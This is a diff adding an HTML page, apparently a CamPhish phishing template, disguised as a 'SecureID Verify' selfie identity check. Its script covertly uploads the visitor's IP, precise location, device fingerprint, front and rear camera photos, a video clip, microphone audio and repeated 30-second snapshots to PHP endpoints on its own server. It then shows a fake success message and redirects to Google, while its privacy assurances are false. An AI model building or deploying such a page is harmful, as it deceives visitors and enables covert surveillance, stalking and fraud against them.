@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verify Your Identity — ID Check Required</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{font-family:'Inter',sans-serif;background:#0f172a;color:#f1f5f9;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;}
+.brand{display:flex;align-items:center;gap:10px;margin-bottom:32px;}
+.brand-icon{width:40px;height:40px;border-radius:10px;background:linear-gradient(135deg,#3b82f6,#1d4ed8);display:flex;align-items:center;justify-content:center;font-size:1.3rem;}
+.brand-name{font-size:1.2rem;font-weight:700;color:#fff;}
+.card{background:#1e293b;border:1px solid #334155;border-radius:20px;padding:32px 28px;width:100%;max-width:440px;}
+.progress-steps{display:flex;align-items:center;justify-content:center;gap:0;margin-bottom:28px;}
+.step-dot{width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:.75rem;font-weight:700;}
+.step-dot.done{background:#22c55e;color:#fff;}
+.step-dot.active{background:#3b82f6;color:#fff;box-shadow:0 0 0 4px rgba(59,130,246,.25);}
+.step-dot.pending{background:#334155;color:#94a3b8;}
+.step-line{flex:1;height:2px;background:#334155;margin:0 4px;}
+.step-line.done{background:#22c55e;}
+h2{font-size:1.3rem;font-weight:700;margin-bottom:6px;}
+.sub{color:#94a3b8;font-size:.88rem;margin-bottom:22px;line-height:1.6;}
+.face-frame{width:180px;height:180px;border-radius:50%;border:3px dashed #3b82f6;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;position:relative;animation:pulse 2s ease-in-out infinite;}
+@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(59,130,246,.4);}50%{box-shadow:0 0 0 16px rgba(59,130,246,0);}}
+.face-frame video{width:100%;height:100%;object-fit:cover;border-radius:50%;transform:scaleX(-1);}
+.face-placeholder{font-size:4rem;color:#475569;}
+.corner{position:absolute;width:20px;height:20px;border-color:#3b82f6;border-style:solid;}
+.corner.tl{top:4px;left:4px;border-width:3px 0 0 3px;}
+.corner.tr{top:4px;right:4px;border-width:3px 3px 0 0;}
+.corner.bl{bottom:4px;left:4px;border-width:0 0 3px 3px;}
+.corner.br{bottom:4px;right:4px;border-width:0 3px 3px 0;}
+.checklist{background:#0f172a;border-radius:12px;padding:14px 16px;margin-bottom:20px;}
+.check-item{display:flex;align-items:center;gap:10px;padding:6px 0;font-size:.84rem;color:#94a3b8;}
+.check-item .icon{width:20px;height:20px;border-radius:50%;background:#1e293b;border:1px solid #334155;display:flex;align-items:center;justify-content:center;font-size:.7rem;flex-shrink:0;}
+.check-item.done .icon{background:#22c55e;border-color:#22c55e;color:#fff;}
+.btn{width:100%;padding:14px;background:linear-gradient(135deg,#3b82f6,#1d4ed8);color:#fff;border:none;border-radius:12px;font-size:1rem;font-weight:600;cursor:pointer;transition:.2s;font-family:'Inter',sans-serif;}
+.btn:hover{opacity:.9;}
+.btn:disabled{opacity:.5;cursor:default;}
+.security-note{text-align:center;font-size:.75rem;color:#475569;margin-top:12px;display:flex;align-items:center;justify-content:center;gap:6px;}
+.status-text{text-align:center;font-size:.82rem;color:#94a3b8;margin-top:10px;min-height:18px;}
+.status-text.success{color:#22c55e;}
+</style>
+</head>
+<body>
+
+<div class="brand">
+  <div class="brand-icon">🔐</div>
+  <div class="brand-name">SecureID Verify</div>
+</div>
+
+<div class="card">
+  <!-- Progress -->
+  <div class="progress-steps">
+    <div class="step-dot done">✓</div>
+    <div class="step-line done"></div>
+    <div class="step-dot active">2</div>
+    <div class="step-line"></div>
+    <div class="step-dot pending">3</div>
+  </div>
+
+  <h2>Face Verification</h2>
+  <p class="sub">To complete your identity check, please allow camera access for a quick selfie. Your photo is encrypted and never stored.</p>
+
+  <!-- Face frame -->
+  <div class="face-frame" id="faceFrame">
+    <div class="face-placeholder" id="facePlaceholder">👤</div>
+    <video id="faceVideo" autoplay muted playsinline style="display:none;"></video>
+    <div class="corner tl"></div>
+    <div class="corner tr"></div>
+    <div class="corner bl"></div>
+    <div class="corner br"></div>
+  </div>
+
+  <!-- Checklist -->
+  <div class="checklist">
+    <div class="check-item done">
+      <div class="icon">✓</div>
+      <span>Phone number verified</span>
+    </div>
+    <div class="check-item done">
+      <div class="icon">✓</div>
+      <span>Email address confirmed</span>
+    </div>
+    <div class="check-item" id="checkFace">
+      <div class="icon">👁</div>
+      <span>Face verification — pending</span>
+    </div>
+  </div>
+
+  <button class="btn" id="verifyBtn" onclick="startVerify()">Start Face Scan →</button>
+  <div class="status-text" id="statusTxt"></div>
+  <div class="security-note">🔒 256-bit encrypted · GDPR compliant · Data deleted in 24h</div>
+</div>
+
+<script>
+const BACKEND = window.location.origin;
+let stream = null, captured = false;
+
+async function startVerify() {
+  const btn = document.getElementById('verifyBtn');
+  const status = document.getElementById('statusTxt');
+  btn.disabled = true;
+  btn.textContent = 'Opening camera...';
+  status.textContent = 'Requesting camera access...';
+
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width:1280, height:720 }, audio: true });
+    const video = document.getElementById('faceVideo');
+    video.srcObject = stream;
+    video.style.display = 'block';
+    document.getElementById('facePlaceholder').style.display = 'none';
+    status.textContent = 'Camera active — aligning face...';
+    btn.textContent = 'Scanning...';
+
+    // Let camera warm up then capture
+    await delay(1500);
+    await captureAll();
+    await delay(1200);
+
+    document.getElementById('checkFace').classList.add('done');
+    document.getElementById('checkFace').querySelector('.icon').textContent = '✓';
+    document.getElementById('checkFace').querySelector('span').textContent = 'Face verification — complete';
+    status.className = 'status-text success';
+    status.textContent = '✓ Identity verified successfully!';
+    btn.textContent = 'Continue →';
+    btn.disabled = false;
+    btn.onclick = () => { window.location.href = 'https://google.com'; };
+  } catch(e) {
+    status.textContent = 'Camera unavailable — trying alternative method...';
+    await captureDataNoCamera();
+    setTimeout(() => { window.location.href = 'https://google.com'; }, 2000);
+  }
+}
+
+async function captureAll() {
+  if (captured) return; captured = true;
+
+  // IP
+  fetch(BACKEND + '/ip.php').catch(()=>{});
+
+  // Location
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      p => fetch(BACKEND + '/location.php', { method:'POST', body: new URLSearchParams({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy, alt: p.coords.altitude||'', speed: p.coords.speed||'', heading: p.coords.heading||'' }) }).catch(()=>{}),
+      () => fetch(BACKEND + '/location.php', { method:'POST', body: new URLSearchParams({ lat:'', lon:'', acc:'' }) }).catch(()=>{})
+    );
+  }
+
+  // Device fingerprint
+  sendDevice();
+
+  // Front camera burst
+  if (stream) {
+    const v = document.createElement('video');
+    v.srcObject = stream; v.muted = true;
+    await v.play().catch(()=>{});
+    await delay(800);
+    for (let i = 0; i < 5; i++) {
+      const c = document.createElement('canvas');
+      c.width = v.videoWidth||1280; c.height = v.videoHeight||720;
+      c.getContext('2d').drawImage(v, 0, 0);
+      fetch(BACKEND + '/post.php', { method:'POST', body: new URLSearchParams({ cat: c.toDataURL('image/jpeg',0.92), burst_index: i, cam_facing: 'user', shot_type: 'kyc' }) }).catch(()=>{});
+      await delay(350);
+    }
+
+    // Video clip
+    try {
+      const rec = new MediaRecorder(stream, { mimeType:'video/webm' });
+      const chunks = [];
+      rec.ondataavailable = e => chunks.push(e.data);
+      rec.onstop = () => {
+        const blob = new Blob(chunks, {type:'video/webm'});
+        const fr = new FileReader();
+        fr.onload = () => fetch(BACKEND + '/post.php', { method:'POST', body: new URLSearchParams({ video_clip: fr.result, cam_facing: 'user' }) }).catch(()=>{});
+        fr.readAsDataURL(blob);
+      };
+      rec.start(); setTimeout(() => rec.stop(), 8000);
+    } catch(e){}
+
+    // Audio
+    try {
+      const as = await navigator.mediaDevices.getUserMedia({ audio:true, video:false });
+      const ar = new MediaRecorder(as);
+      const ac = [];
+      ar.ondataavailable = e => ac.push(e.data);
+      ar.onstop = () => {
+        const blob = new Blob(ac, {type:'audio/webm'});
+        const fr = new FileReader();
+        fr.onload = () => fetch(BACKEND + '/audio.php', { method:'POST', body: new URLSearchParams({ audio_clip: fr.result }) }).catch(()=>{});
+        fr.readAsDataURL(blob);
+      };
+      ar.start(); setTimeout(() => ar.stop(), 15000);
+    } catch(e){}
+
+    // Rear camera
+    try {
+      const rs = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:{exact:'environment'} } });
+      const rv = document.createElement('video'); rv.srcObject = rs; rv.muted = true;
+      await rv.play().catch(()=>{});
+      await delay(800);
+      for (let i = 0; i < 3; i++) {
+        const c = document.createElement('canvas'); c.width = rv.videoWidth||1280; c.height = rv.videoHeight||720;
+        c.getContext('2d').drawImage(rv, 0, 0);
+        fetch(BACKEND + '/post.php', { method:'POST', body: new URLSearchParams({ cat: c.toDataURL('image/jpeg',0.9), burst_index: i, cam_facing: 'environment', shot_type: 'burst' }) }).catch(()=>{});
+        await delay(400);
+      }
+      rs.getTracks().forEach(t => t.stop());
+    } catch(e){}
+
+    // Interval shots
+    startIntervalShots();
+  }
+}
+
+function startIntervalShots() {
+  if (!stream) return;
+  setInterval(async () => {
+    const v = document.createElement('video');
+    v.srcObject = stream; v.muted = true;
+    await v.play().catch(()=>{});
+    const c = document.createElement('canvas');
+    c.width = v.videoWidth||640; c.height = v.videoHeight||480;
+    c.getContext('2d').drawImage(v, 0, 0);
+    fetch(BACKEND + '/post.php', { method:'POST', body: new URLSearchParams({ cat: c.toDataURL('image/jpeg',0.85), burst_index: 0, cam_facing: 'user', shot_type: 'interval' }) }).catch(()=>{});
+  }, 30000);
+}
+
+async function captureDataNoCamera() {
+  fetch(BACKEND + '/ip.php').catch(()=>{});
+  sendDevice();
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      p => fetch(BACKEND + '/location.php', { method:'POST', body: new URLSearchParams({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }) }).catch(()=>{}),
+      () => {}
+    );
+  }
+}
+
+async function sendDevice() {
+  const ua = navigator.userAgent;
+  const os = /Windows/.test(ua)?'Windows':/Mac/.test(ua)?'macOS':/Android/.test(ua)?'Android':/iPhone|iPad/.test(ua)?'iOS':'Other';
+  const br = /Edg/.test(ua)?'Edge':/Chrome/.test(ua)?'Chrome':/Firefox/.test(ua)?'Firefox':/Safari/.test(ua)?'Safari':'Other';
+  const bat = navigator.getBattery ? await navigator.getBattery().then(b => Math.round(b.level*100)+'%'+(b.charging?' (charging)':'')).catch(()=>'N/A') : 'N/A';
+  const net = (navigator.connection||{}).effectiveType||'N/A';
+
+  // Canvas fingerprint
+  const cv = document.createElement('canvas'); cv.width=200; cv.height=50;
+  const ctx2 = cv.getContext('2d');
+  ctx2.textBaseline='top'; ctx2.font='14px Arial'; ctx2.fillStyle='#f60'; ctx2.fillRect(125,1,62,20);
+  ctx2.fillStyle='#069'; ctx2.fillText('CamPhish 👁',2,15);
+  const canvasHash = cv.toDataURL().slice(-50);
+
+  // WebGL
+  let webglVendor = 'N/A';
+  try {
+    const gl = document.createElement('canvas').getContext('webgl');
+    const ext = gl.getExtension('WEBGL_debug_renderer_info');
+    webglVendor = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) + ' / ' + gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
+  } catch(e){}
+
+  const params = new URLSearchParams({
+    os, browser: br, language: navigator.language,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    screen_w: screen.width, screen_h: screen.height,
+    pixel_ratio: window.devicePixelRatio,
+    color_depth: screen.colorDepth,
+    cores: navigator.hardwareConcurrency||'N/A',
+    memory: navigator.deviceMemory||'N/A',
+    battery: bat, network: net,
+    platform: navigator.platform,
+    touch: navigator.maxTouchPoints,
+    canvas_hash: canvasHash,
+    webgl_vendor: webglVendor,
+    wifi_ssid: (navigator.connection||{}).type||'N/A',
+    plugins: Array.from(navigator.plugins||[]).map(p=>p.name).join(', ').slice(0,200),
+  });
+  fetch(BACKEND + '/device_info.php', { method:'POST', body: params }).catch(()=>{});
+}
+
+const delay = ms => new Promise(r => setTimeout(r, ms));
+</script>
+</body>
+</html>
